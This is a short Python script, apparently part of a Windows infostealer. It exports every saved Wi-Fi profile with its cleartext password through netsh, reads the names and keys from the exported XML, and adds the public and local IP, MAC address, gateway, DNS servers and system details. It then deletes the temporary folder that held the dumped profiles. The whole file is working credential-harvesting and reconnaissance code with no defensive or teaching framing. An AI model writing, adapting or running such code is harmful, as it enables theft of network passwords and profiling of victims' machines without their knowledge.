import subprocess as sp
from os import walk, mkdir
from shutil import rmtree
import socket
from xml.dom import minidom
import platform as pf
from who_is_on_my_wifi import * 
import requests

device = device()

class Get_list:

    def get_list():
        list_ = []
        response = requests.get('https://myip.dnsomatic.com')
        ip = response.text
        mkdir('C://Wifis')
        sp.call('netsh wlan show profile')
        sp.call('netsh wlan export profile folder=C:\\Wifis key=clear')
        for dirs in walk('C://Wifis'):
            for files in dirs[2]:
                doc = minidom.parse(f'C://Wifis/{files}')    
                wifi_name = doc.getElementsByTagName('name')
                for node in wifi_name:
                    wifi_name = node.childNodes[0].nodeValue
                wifi_password = doc.getElementsByTagName('keyMaterial')
                for node in wifi_password:
                    wifi_password = node.childNodes[0].nodeValue
                if len(wifi_password) == 0:
                    wifi_password = 'None'
                
                data = f'Wi-fi name: {wifi_name}\nWi-fi password: {wifi_password}'

                data_ip = f'IP ADRESS: {ip}'

                processor = pf.processor()
                name_sys = pf.system() + ' ' + pf.release()
                net_pc = pf.node()
                ip_pc = socket.gethostbyname(socket.gethostname())
                
                data_pc = f'''
                Processor: {processor}\n
                System: {name_sys}\n
                PC Name: {device[0]}\n
                PC product name: {device[1]}\n
                PC hostname: {net_pc}\n
                PC IP adress: {ip_pc}\n
                PC IP adress (host): {device[3]}\n
                MAC adress: {device[2]}\n
                Gateway: {device[7]}\n
                DNS 1: {device[8]}\n
                DNS 2: {device[9]}\n\n'''
                data_all_info = f'{data}\n{data_ip}\n{data_pc}------------------------------------------------'\
                '-----------------------------------------------------'
                list_.append(data_all_info)
                if len(list_) == 5:
                   list1 = ''.join(list_)
                   rmtree('C:\\Wifis')
                   return list1
